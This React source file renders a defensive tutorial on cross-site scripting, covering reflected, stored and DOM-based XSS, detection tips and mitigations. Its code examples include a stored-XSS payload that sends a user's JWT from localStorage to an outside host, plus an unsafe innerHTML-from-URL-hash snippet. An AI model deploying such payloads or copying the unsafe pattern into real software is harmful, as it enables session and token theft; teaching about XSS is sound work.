import { FrameProvider } from './data/frameData'

import {Header2, Header3, Header5, Paragraph, Eyebrow} from '@/components/Typography.jsx'
import Frame from './components/Frame'
import TitleFrame from './components/TitleFrame'
import FinalFrame from './components/FinalFrame'
import Code from './components/Code'

const codeExamples = {
    reflected: `https://example.com?name=<script>alert(1)</script>`,
    stored: `{
    "comment": "<script>
        fetch('https://data.co/?t=' + localStorage.getItem('jwt'))
    </script>"
}`,
    dom: `const content = location.hash.substring(1);
document.getElementById('output').innerHTML = content;`,
}


function App() {

  return (
    <FrameProvider>
      <div className='grid grid-cols-1 gap-12 bg-slate-950 p-10'>
        
        <TitleFrame 
          title={<><div className='text-lg text-gray'>Attack Vectors Every Developer Should Know</div>
            <div className=''>Cross-Site Scripting</div></>
          } 
          description={
            <>
              <Paragraph>Cross-Site Scripting is one of the most common, and potentially devastating, vulnerabilities in web development. It happens when untrusted input is rendered without proper sanitization or encoding, letting attackers inject scripts into a user’s browser.</Paragraph>
              <Paragraph>The impact can range from stolen tokens and session hijacking to full account compromise, and it often goes unnoticed until it’s exploited. Whether you’re writing front-end components or building APIs, understanding Cross-Site Scripting is foundational knowledge. Every developer should know how it works, how to recognize the signs, and how to prevent it through secure patterns and a security-conscious mindset.</Paragraph>
              
            </>
          }
        ></TitleFrame>

          {/* XSS */}
        <Frame>
          <div className='vg-content flex flex-col gap-4 justify-start pt-5'>
            <Header2 className='text-3xl'>What Is Cross-Site Scripting (XSS)?</Header2>
            <Paragraph className="max-w-11/12">Cross-Site Scripting, commonly called XSS, is a type of security vulnerability that allows attackers to inject and run malicious JavaScript in someone else’s browser using your own code. It usually happens when an application accepts user input and sends it back to the page without properly escaping or sanitizing it.</Paragraph>
            <Paragraph className="max-w-11/12 pt-6">This can happen in a few different ways:</Paragraph>
            <ul className='grid grid-cols-1 gap-2 pl-6'>
                <li><Paragraph className="max-w-full">- Reflecting user input directly into the page (like query strings or form fields).</Paragraph></li>
                <li><Paragraph className="max-w-full">- Storing malicious content in a database and rendering it later (think: comments, bios, or messages).</Paragraph></li>
                <li><Paragraph className="max-w-full">- Manipulating DOM elements with untrusted values from URLs, cookies, or form fields.</Paragraph></li>
            </ul>
            <Paragraph className="max-w-11/12 pt-6">Once that unfiltered input hits the DOM, the browser has no way to know it didn’t come from your app. If it looks like code, it runs like code.</Paragraph>
            </div>
        </Frame>

          {/* reflected */}
        <Frame>
            <div className='vg-content flex flex-col gap-4 justify-start pt-5'>
                <div>
                    <Eyebrow className='text-md'>Types of XSS</Eyebrow>
                    <Header2 className='text-3xl'>Reflected</Header2>
                </div>
                <Paragraph className="max-w-11/12">A user clicks a malicious link that includes a script in the URL. That script is reflected back by the server into the HTML without escaping. The browser renders the page and runs the script... just like it came from your app.</Paragraph>
                    <div className="grid grid-cols-1 gap-8 pt-4">
                        <div className='grid grid-cols-1 gap-2'>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Example Attack</Paragraph>
                        <Code>{codeExamples['reflected']}</Code>
                        <Paragraph className="max-w-11/12">If the name param is injected into the page without escaping, the browser will run it. Using this method, the attack can compromise accounts, credentials, and much more by sharing a poisoned link.</Paragraph>
                    </div>
                    <div>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Where it shows up</Paragraph>
                        <Paragraph className="max-w-11/12">Query params, form inputs, URL fragments.</Paragraph>
                    </div>
                    <div>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Common sources</Paragraph>
                        <Paragraph className="max-w-11/12">Search boxes, login errors, client-side route parameters.</Paragraph>
                    </div>
                    </div>
            </div>
        </Frame>

          {/* stored */}
        <Frame>
            <div className='vg-content flex flex-col gap-4 justify-start pt-5'>
                <div>   
                    <Eyebrow className='text-md'>Types of XSS</Eyebrow>
                    <Header2 className='text-3xl'>Stored</Header2>
                </div>
                <Paragraph className="max-w-11/12">Malicious input is submitted, saved in a database, and later displayed to others.</Paragraph>
                    <div className="grid grid-cols-1 gap-8 pt-4">
                        <div className='grid grid-cols-1 gap-2'>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Example Attack</Paragraph>
                        <Code>{codeExamples['stored']}</Code>
                        <Paragraph className="max-w-11/12">An attacker leaves a comment containing a script. Every user who loads the post executes the script.</Paragraph>
                    </div>
                    <div>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Where it shows up</Paragraph>
                        <Paragraph className="max-w-11/12"> Comment sections, user profiles, forums.</Paragraph>
                    </div>
                    <div>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Common sources</Paragraph>
                        <Paragraph className="max-w-11/12">Any user-generated content that’s saved and rendered later.</Paragraph>
                    </div>
                    </div>
            </div>
        </Frame>

          {/* DOM */}
        <Frame>
            <div className='vg-content flex flex-col gap-4 justify-start pt-5'>
                <div>
                    <Eyebrow className='text-md'>Types of XSS</Eyebrow>
                    <Header2 className='text-3xl'>DOM-Based</Header2>
                </div>
                <Paragraph className="max-w-11/12">This attack doesn’t rely on the server. Instead, your client-side code handles unsafe input in a way that introduces script execution.</Paragraph>
                    <div className="grid grid-cols-1 gap-8 pt-4">
                        <div className='grid grid-cols-1 gap-2'>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Example Attack</Paragraph>
                        <Code>{codeExamples['dom']}</Code>
                        <Paragraph className="max-w-11/12">If the hash includes a script tag, it's game over.</Paragraph>
                    </div>
                    <div>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Where it shows up</Paragraph>
                        <Paragraph className="max-w-11/12">JavaScript that handles input directly from the DOM, like location, hash, document.write, or innerHTML.</Paragraph>
                    </div>
                    <div>
                        <Paragraph className="max-w-11/12 text-sm font-bold text-bronze uppercase tracking-wider">Common sources</Paragraph>
                        <Paragraph className="max-w-11/12">window.location, document.cookie, localStorage, and sessionStorage.</Paragraph>
                    </div>
                    </div>
            </div>
        </Frame>

          {/* Spot */}
        <Frame>
            <div className='vg-content flex flex-col gap-4 justify-start pt-5'>
                <Header2 className='text-3xl'>How to Spot XSS Vulnerabilities</Header2>
                <Paragraph className="max-w-11/12">In a real attack, you won’t see an alert box. In reality, XSS often hides in subtle behaviors and overlooked code paths. Here’s what to keep an eye out for:</Paragraph>
                <ul className='grid grid-cols-1 gap-2 pl-6'>
                    <li><Paragraph className="max-w-full">- Inserting user input directly into innerHTML, document.write, v-html, or dangerouslySetInnerHTML, especially without sanitization.</Paragraph></li>
                    <li><Paragraph className="max-w-full">- Rendering raw strings in templates that bypass escaping (e.g., in emails, chat UIs, markdown renderers).</Paragraph></li>
                    <li><Paragraph className="max-w-full">- Manipulating values from window.location, document.cookie, document.referrer, or URL fragments and injecting them into the DOM.</Paragraph></li>
                    <li><Paragraph className="max-w-full">- Reflecting form data or query strings directly back into the UI without validation.</Paragraph></li>
                    <li><Paragraph className="max-w-full">- Using client-side rendering logic that assumes all data is safe because it came from a “trusted” endpoint.</Paragraph></li>
                </ul>
                <Paragraph className="max-w-11/12"><span className='font-bold'>Tip</span>: Always ask yourself: Can I trust this value? Did it come from a user?</Paragraph>
                    <div className='grid grid-cols-1 gap-1 pt-6'>
                        <Paragraph className="max-w-11/12 text-sm font-bold uppercase tracking-wider"><span className="text-bronze">Don't Panic</span></Paragraph>
                        <Paragraph className="max-w-11/12">Spotting a potential XSS risk doesn’t mean your entire app is moments away from being critically compromised. It means you’re paying attention.</Paragraph>
                    </div>
            </div>
        </Frame>

        {/* Mitigation */}
        <Frame>
            <div className='vg-content flex flex-col gap-4 justify-start pt-5'>
            <Header2 className='text-3xl'>How to Mitigate XSS</Header2>
            <Paragraph className="max-w-11/12">The most dangerous vulnerabilities often don’t come from obscure exploits. They come from ordinary code written without guardrails. Building securely is about building foundational habits.</Paragraph>
            <ul className='grid grid-cols-1 gap-4 pl-6'>
                <li><Paragraph className="max-w-full"><span className="font-bold">-  Escape output</span>: Before rendering any dynamic content into the DOM, make sure it’s properly escaped. Use built-in templating protections or trusted libraries. </Paragraph></li>
                <li><Paragraph className="max-w-full"><span className="font-bold">-  Sanitize inputs</span>: Reject anything unexpected. If you’re accepting HTML (e.g., for markdown, user bios, or comments), run it through a sanitizer like DOMPurify. Strip scripts, inline event handlers, and suspicious attributes before anything hits the page.</Paragraph></li>
                <li><Paragraph className="max-w-full"><span className="font-bold">-  Use frameworks safely</span>: Frameworks do a lot to protect you if you let them lead. React, for example, escapes variables in JSX, but dangerouslySetInnerHTML skips all safety checks. Same goes for Vue's v-html. Use it rarely, and always with sanitized content.</Paragraph></li>
                <li><Paragraph className="max-w-full"><span className="font-bold">-  Set CSP headers</span>: A good CSP helps block inline scripts, restricts what domains can run code, and adds a fallback if XSS slips through. It’s not a silver bullet... but it’s a strong second line of defense.</Paragraph></li>
            </ul>
            </div>
        </Frame>
        
        <FinalFrame title="That's all, Folks">
            <Paragraph>XSS is easy to overlook, but it's just as easy to prevent with the right habits and awareness. It only takes one missed input to expose your users. Make input handling a part of your daily workflow, not just something you patch after a report.</Paragraph>
            <Paragraph>I'll be covering more attack vectors you should be aware of soon. If that interests you, feel free to follow or connect with me. If you have any stories of spotting an XSS vulnerability in the wild, drop it in the comments. I'm always interested in hearing about them!</Paragraph>
        </FinalFrame>
      </div>
    </FrameProvider>
  )
}

export default App
